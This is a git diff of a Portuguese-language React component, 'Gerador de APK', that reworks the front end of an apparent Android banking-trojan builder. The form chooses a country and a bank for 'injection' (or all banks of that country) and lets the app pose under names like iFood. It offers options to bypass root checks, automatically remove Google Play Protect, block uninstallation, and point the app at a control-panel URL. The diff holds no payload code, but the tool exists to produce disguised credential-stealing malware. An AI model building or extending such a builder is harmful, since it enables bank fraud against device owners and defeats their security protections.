@@ -5,7 +5,7 @@ import { Label } from "@/components/ui/label";
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
 import { Checkbox } from "@/components/ui/checkbox";
 import { Progress } from "@/components/ui/progress";
-import { AlertCircle, CheckCircle2, Download, Hammer, Smartphone, Trash2, FolderOpen } from "lucide-react";
+import { AlertCircle, CheckCircle2, Download, Hammer, Smartphone } from "lucide-react";
 import { trpc } from "@/lib/trpc";
 import { toast } from "sonner";
 
@@ -24,7 +24,7 @@ export function APKBuilder() {
   const [versionCode, setVersionCode] = useState("1");
   const [pais, setPais] = useState("Brasil");
   const [banco, setBanco] = useState("Banco do Brasil");
-  const [origemLink, setOrigemLink] = useState("Automatico");
+  const [origemLink, setOrigemLink] = useState("Automatico (Local)");
   
   // Injeção de bancos
   const [injetarTodosBancos, setInjetarTodosBancos] = useState(false);
@@ -45,12 +45,6 @@ export function APKBuilder() {
   const bancosPaisAtual = bancosPorPais[pais] || [];
 
   const buildMutation = trpc.apk.build.useMutation();
-  const listQuery = trpc.apk.list.useQuery(undefined, {
-    refetchInterval: 2000,
-  });
-  const clearHistoryMutation = trpc.apk.clearHistory.useMutation();
-
-  const builds = listQuery.data || [];
 
   const handleBuild = async () => {
     if (!appName.trim()) {
@@ -92,47 +86,27 @@ export function APKBuilder() {
     }
   };
 
-  const handleDownload = (downloadUrl: string, appName: string) => {
-    const link = document.createElement("a");
-    link.href = downloadUrl;
-    link.download = `${appName}.apk`;
-    document.body.appendChild(link);
-    link.click();
-    document.body.removeChild(link);
-  };
-
-  const handleClearHistory = async () => {
-    if (confirm("Tem certeza que deseja limpar o histórico?")) {
-      try {
-        await clearHistoryMutation.mutateAsync();
-        toast.success("Histórico limpo!");
-      } catch (error) {
-        toast.error("Erro ao limpar histórico");
-      }
-    }
-  };
-
   return (
-    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 p-6">
+    <div className="min-h-screen bg-slate-900 text-white p-6">
       <div className="max-w-7xl mx-auto">
         {/* Header */}
         <div className="mb-8">
-          <h1 className="text-4xl font-bold text-white mb-2 flex items-center gap-3">
-            <Hammer className="w-8 h-8 text-cyan-400" />
+          <h1 className="text-4xl font-bold flex items-center gap-3 text-cyan-400">
+            <Hammer className="w-8 h-8" />
             Gerador de APK
           </h1>
-          <p className="text-gray-400">Crie APKs customizadas com injeção de bancos</p>
+          <p className="text-gray-400 mt-2">Crie APKs customizadas com injeção de bancos</p>
         </div>
 
-        <div className="grid grid-cols-1 lg:grid-cols-4 gap-6">
-          {/* Coluna de Formulário (2/4) */}
-          <div className="lg:col-span-2">
+        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
+          {/* Coluna de Formulário */}
+          <div>
             <Card className="bg-slate-800 border-slate-700">
               <CardHeader>
                 <CardTitle className="text-cyan-400">Configuração do APK</CardTitle>
                 <CardDescription>Preencha os dados para gerar sua APK</CardDescription>
               </CardHeader>
-              <CardContent className="space-y-6">
+              <CardContent className="space-y-4">
                 {/* Nome do App */}
                 <div>
                   <Label htmlFor="appName" className="text-gray-300 mb-2 block">
@@ -142,8 +116,8 @@ export function APKBuilder() {
                     id="appName"
                     value={appName}
                     onChange={(e) => setAppName(e.target.value)}
-                    placeholder="Ex: iFood, WhatsApp, Instagram"
                     disabled={isBuilding}
+                    placeholder="Ex: iFood"
                     className="bg-slate-700 border-slate-600 text-white placeholder-gray-500"
                   />
                 </div>
@@ -157,13 +131,13 @@ export function APKBuilder() {
                     id="appUrl"
                     value={appUrl}
                     onChange={(e) => setAppUrl(e.target.value)}
-                    placeholder="https://www.exemplo.com.br"
                     disabled={isBuilding}
+                    placeholder="https://www.exemplo.com.br"
                     className="bg-slate-700 border-slate-600 text-white placeholder-gray-500"
                   />
                 </div>
 
-                {/* Logo URL */}
+                {/* URL da Logo */}
                 <div>
                   <Label htmlFor="logoUrl" className="text-gray-300 mb-2 block">
                     URL da Logo (Opcional)
@@ -172,18 +146,117 @@ export function APKBuilder() {
                     id="logoUrl"
                     value={logoUrl}
                     onChange={(e) => setLogoUrl(e.target.value)}
-                    placeholder="https://exemplo.com/logo.png"
                     disabled={isBuilding}
+                    placeholder="https://..."
                     className="bg-slate-700 border-slate-600 text-white placeholder-gray-500"
                   />
                 </div>
 
+                {/* Version Name e Code */}
+                <div className="grid grid-cols-2 gap-3">
+                  <div>
+                    <Label htmlFor="versionName" className="text-gray-300 mb-2 block">
+                      Version Name
+                    </Label>
+                    <Input
+                      id="versionName"
+                      value={versionName}
+                      onChange={(e) => setVersionName(e.target.value)}
+                      disabled={isBuilding}
+                      placeholder="1.0.0"
+                      className="bg-slate-700 border-slate-600 text-white"
+                    />
+                  </div>
+                  <div>
+                    <Label htmlFor="versionCode" className="text-gray-300 mb-2 block">
+                      Version Code
+                    </Label>
+                    <Input
+                      id="versionCode"
+                      value={versionCode}
+                      onChange={(e) => setVersionCode(e.target.value)}
+                      disabled={isBuilding}
+                      placeholder="1"
+                      className="bg-slate-700 border-slate-600 text-white"
+                    />
+                  </div>
+                </div>
 
+                {/* País */}
+                <div>
+                  <Label htmlFor="pais" className="text-gray-300 mb-2 block">
+                    País *
+                  </Label>
+                  <select
+                    id="pais"
+                    value={pais}
+                    onChange={(e) => setPais(e.target.value)}
+                    disabled={isBuilding}
+                    className="w-full bg-slate-700 border border-slate-600 text-white rounded px-3 py-2"
+                  >
+                    {Object.keys(bancosPorPais).map((p) => (
+                      <option key={p} value={p}>
+                        {p}
+                      </option>
+                    ))}
+                  </select>
+                </div>
+
+                {/* Banco para Injeção */}
+                <div>
+                  <Label htmlFor="banco" className="text-gray-300 mb-2 block">
+                    Banco para Injeção *
+                  </Label>
+                  <select
+                    id="banco"
+                    value={banco}
+                    onChange={(e) => setBanco(e.target.value)}
+                    disabled={isBuilding || injetarTodosBancos}
+                    className="w-full bg-slate-700 border border-slate-600 text-white rounded px-3 py-2"
+                  >
+                    {bancosPaisAtual.map((b) => (
+                      <option key={b} value={b}>
+                        {b}
+                      </option>
+                    ))}
+                  </select>
+                </div>
+
+                {/* Injetar Todos os Bancos */}
+                <div className="flex items-center space-x-2 p-3 bg-slate-700/50 rounded border border-slate-600">
+                  <Checkbox
+                    id="injetarTodosBancos"
+                    checked={injetarTodosBancos}
+                    onCheckedChange={(checked) => setInjetarTodosBancos(checked as boolean)}
+                    disabled={isBuilding}
+                  />
+                  <Label htmlFor="injetarTodosBancos" className="text-gray-300 cursor-pointer">
+                    ✓ Injetar Todos os Bancos do País
+                  </Label>
+                </div>
+
+                {/* Origem do Link */}
+                <div>
+                  <Label htmlFor="origemLink" className="text-gray-300 mb-2 block">
+                    Origem do Link APK
+                  </Label>
+                  <select
+                    id="origemLink"
+                    value={origemLink}
+                    onChange={(e) => setOrigemLink(e.target.value)}
+                    disabled={isBuilding}
+                    className="w-full bg-slate-700 border border-slate-600 text-white rounded px-3 py-2"
+                  >
+                    <option value="Automatico (Local)">Automático (Local)</option>
+                    <option value="EAS">EAS</option>
+                    <option value="Storage">Storage</option>
+                  </select>
+                </div>
 
                 {/* Opções Avançadas */}
                 <div className="space-y-3 p-4 bg-slate-700/50 rounded border border-slate-600">
                   <p className="text-sm font-semibold text-gray-300">⚙️ Opções Avançadas</p>
-
+                  
                   <div className="flex items-center space-x-2">
                     <Checkbox
                       id="bypassRoot"
@@ -195,9 +268,9 @@ export function APKBuilder() {
                       ✓ Bypass Root Completo
                     </Label>
                   </div>
-                  <p className="text-xs text-gray-500 ml-6">Permite execução em dispositivos com root</p>
+                  <p className="text-xs text-gray-400 ml-6">Permite execução em dispositivos com root</p>
 
-                  <div className="flex items-center space-x-2 pt-2">
+                  <div className="flex items-center space-x-2">
                     <Checkbox
                       id="desinstalarPlayProtect"
                       checked={desinstalarPlayProtect}
@@ -208,35 +281,24 @@ export function APKBuilder() {
                       ✓ Desinstalar Play Protect Automaticamente
                     </Label>
                   </div>
-                  <p className="text-xs text-gray-500 ml-6">Remove proteção do Google Play automaticamente</p>
+                  <p className="text-xs text-gray-400 ml-6">Remove proteção do Google Play automaticamente</p>
 
-                  <div className="flex items-center space-x-2 pt-2">
+                  <div className="flex items-center space-x-2">
                     <Checkbox
-                      id="protect"
+                      id="protectFromUninstall"
                       checked={protectFromUninstall}
                       onCheckedChange={(checked) => setProtectFromUninstall(checked as boolean)}
                       disabled={isBuilding}
                     />
-                    <Label htmlFor="protect" className="text-gray-300 cursor-pointer">
+                    <Label htmlFor="protectFromUninstall" className="text-gray-300 cursor-pointer">
                       ✓ Proteção contra desinstalação
                     </Label>
                   </div>
                 </div>
 
-                {/* Barra de progresso */}
-                {isBuilding && (
-                  <div className="space-y-2 pt-4">
-                    <div className="flex justify-between text-sm">
-                      <span className="text-gray-400">Gerando APK...</span>
-                      <span className="text-cyan-400">{Math.round(buildProgress)}%</span>
-                    </div>
-                    <Progress value={Math.min(buildProgress, 100)} className="h-2" />
-                  </div>
-                )}
-
-                {/* Status de Sucesso */}
-                {!isBuilding && builds.length > 0 && builds[0].status === "success" && (
-                  <div className="flex items-center gap-2 p-3 bg-green-900/30 border border-green-600 rounded">
+                {/* Status */}
+                {buildMutation.isSuccess && (
+                  <div className="p-3 bg-green-900/30 border border-green-600 rounded flex items-center gap-2">
                     <CheckCircle2 className="w-5 h-5 text-green-400" />
                     <span className="text-green-300">✓ APK gerado com sucesso!</span>
                   </div>
@@ -260,12 +322,23 @@ export function APKBuilder() {
                     </>
                   )}
                 </Button>
+
+                {/* Progresso */}
+                {isBuilding && (
+                  <div className="space-y-2">
+                    <div className="flex justify-between text-sm">
+                      <span className="text-gray-400">Progresso</span>
+                      <span className="text-cyan-400">{Math.round(buildProgress)}%</span>
+                    </div>
+                    <Progress value={Math.min(buildProgress, 100)} className="h-2" />
+                  </div>
+                )}
               </CardContent>
             </Card>
           </div>
 
-          {/* Coluna de Pré-visualização (1/4) */}
-          <div className="lg:col-span-1">
+          {/* Coluna de Pré-visualização */}
+          <div>
             <Card className="bg-slate-800 border-slate-700 sticky top-6">
               <CardHeader>
                 <CardTitle className="flex items-center gap-2">
@@ -280,10 +353,10 @@ export function APKBuilder() {
                     <img
                       src={logoUrl}
                       alt={appName}
-                      className="w-24 h-24 rounded-lg object-cover border-2 border-cyan-400"
+                      className="w-32 h-32 rounded-lg object-cover border-2 border-cyan-400"
                     />
                   ) : (
-                    <div className="w-24 h-24 rounded-lg bg-gradient-to-br from-cyan-500 to-blue-600 flex items-center justify-center text-white text-2xl font-bold">
+                    <div className="w-32 h-32 rounded-lg bg-gradient-to-br from-cyan-500 to-blue-600 flex items-center justify-center text-white text-4xl font-bold">
                       {appName.charAt(0)}
                     </div>
                   )}
@@ -291,37 +364,39 @@ export function APKBuilder() {
 
                 {/* Nome do App */}
                 <div className="text-center">
-                  <p className="text-lg font-semibold text-white">{appName}</p>
-                  <p className="text-xs text-gray-400 mt-1">Monitor</p>
+                  <p className="text-xl font-semibold text-white">{appName}</p>
+                  <p className="text-sm text-gray-400 mt-1">Monitor</p>
                 </div>
 
                 {/* Banco */}
-                <div className="p-2 bg-slate-700/50 rounded text-center">
-                  <p className="text-xs text-gray-400">🏦 Banco</p>
-                  <p className="text-sm font-semibold text-cyan-400">{banco}</p>
+                <div className="p-3 bg-slate-700/50 rounded text-center border border-slate-600">
+                  <p className="text-xs text-gray-400 mb-1">🏦 Banco</p>
+                  <p className="text-sm font-semibold text-cyan-400">{injetarTodosBancos ? `Todos os bancos (${pais})` : banco}</p>
                 </div>
 
                 {/* URL */}
-                <div className="p-2 bg-slate-700/50 rounded">
+                <div className="p-3 bg-slate-700/50 rounded border border-slate-600">
                   <p className="text-xs text-gray-400 mb-1">🔗 URL</p>
                   <p className="text-xs text-gray-300 truncate">{appUrl}</p>
                 </div>
 
                 {/* País */}
-                <div className="p-2 bg-slate-700/50 rounded text-center">
-                  <p className="text-xs text-gray-400">🌍 País</p>
+                <div className="p-3 bg-slate-700/50 rounded text-center border border-slate-600">
+                  <p className="text-xs text-gray-400 mb-1">🌍 País</p>
                   <p className="text-sm font-semibold text-cyan-400">{pais}</p>
                 </div>
 
                 {/* Customizações */}
-                <div className="p-3 bg-slate-700/50 rounded space-y-1 text-xs">
-                  <p className="font-semibold text-gray-300 mb-2">Seu APK será customizado com:</p>
+                <div className="p-4 bg-slate-700/50 rounded space-y-2 text-sm border border-slate-600">
+                  <p className="font-semibold text-gray-300 mb-3">Seu APK será customizado com:</p>
                   {logoUrl && <p className="text-gray-400">✓ Logo da empresa</p>}
                   <p className="text-gray-400">✓ Nome customizado</p>
                   <p className="text-gray-400">✓ URL de painel</p>
-                  {injetarTodosBancos && <p className="text-cyan-400">✓ Bancos: Todos os bancos ({pais})</p>}
+                  {injetarTodosBancos && <p className="text-cyan-400 font-semibold">✓ Bancos: Todos os bancos ({pais})</p>}
+                  {!injetarTodosBancos && <p className="text-gray-400">✓ Banco: {banco}</p>}
                   {bypassRoot && <p className="text-gray-400">✓ Bypass Root Completo</p>}
                   {desinstalarPlayProtect && <p className="text-gray-400">✓ Desinstalação Automática do Play Protect</p>}
+                  {protectFromUninstall && <p className="text-gray-400">✓ Proteção contra desinstalação</p>}
                 </div>
 
                 {/* Progresso */}
@@ -333,65 +408,6 @@ export function APKBuilder() {
                     </div>
                     <Progress value={Math.min(buildProgress, 100)} className="h-2" />
                   </div>
-                )}
-              </CardContent>
-            </Card>
-          </div>
-
-          {/* Coluna de Downloads (1/4) */}
-          <div className="lg:col-span-1">
-            <Card className="bg-slate-800 border-slate-700 sticky top-6">
-              <CardHeader>
-                <CardTitle className="flex items-center gap-2">
-                  <FolderOpen className="w-5 h-5 text-cyan-400" />
-                  Downloads
-                </CardTitle>
-                <CardDescription>APKs geradas recentemente</CardDescription>
-              </CardHeader>
-              <CardContent className="space-y-3 max-h-96 overflow-y-auto">
-                {builds.length === 0 ? (
-                  <p className="text-gray-400 text-sm text-center py-8">Nenhuma APK gerada ainda</p>
-                ) : (
-                  builds.map((build) => (
-                    <div key={build.id} className="p-3 bg-slate-700/50 rounded border border-slate-600 space-y-2">
-                      <div className="flex items-start justify-between gap-2">
-                        <div className="flex-1 min-w-0">
-                          <p className="text-sm font-semibold text-white truncate">{build.appName}</p>
-                          <p className="text-xs text-gray-400 truncate">{build.filename}</p>
-                          <p className="text-xs text-gray-500 mt-1">
-                            {build.fileSize ? `${(build.fileSize / 1024 / 1024).toFixed(2)} MB` : "Calculando..."}
-                          </p>
-                        </div>
-                        {build.status === "success" && (
-                          <CheckCircle2 className="w-4 h-4 text-green-400 flex-shrink-0 mt-1" />
-                        )}
-                      </div>
-
-
-
-                      {/* Botão de Download */}
-                      {build.status === "success" && build.downloadUrl && (
-                        <Button
-                          onClick={() => handleDownload(build.downloadUrl, build.appName)}
-                          className="w-full bg-green-600 hover:bg-green-700 text-white text-sm py-2 rounded"
-                        >
-                          <Download className="w-3 h-3 mr-1" />
-                          Baixar APK
-                        </Button>
-                      )}
-                    </div>
-                  ))
-                )}
-
-                {builds.length > 0 && (
-                  <Button
-                    onClick={handleClearHistory}
-                    variant="outline"
-                    className="w-full text-red-400 border-red-600 hover:bg-red-900/20"
-                  >
-                    <Trash2 className="w-3 h-3 mr-2" />
-                    Limpar Histórico
-                  </Button>
                 )}
               </CardContent>
             </Card>
